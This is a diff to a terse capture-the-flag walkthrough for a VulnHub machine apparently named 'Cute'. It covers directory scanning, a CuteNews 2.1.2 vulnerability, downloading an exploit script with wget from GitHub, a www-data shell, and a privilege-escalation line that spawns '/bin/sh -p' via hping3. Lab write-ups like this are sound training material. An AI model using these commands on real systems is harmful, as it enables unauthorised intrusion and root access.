@@ -19,14 +19,16 @@ dirb http://ip
 ```
 
 in <ip>/index.php , CuteNews 2.1.2 vulnerability found 
-
-wget 
+```bash
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Cute/48800.py
+```
 
 www-data shell opened and user flag captured 
 
 
 fox user found
 
+## 3.Privilege Escalation
 
 linpeas.sh executing ---> ./usr/sbin/hping3;/bin/sh -p
 
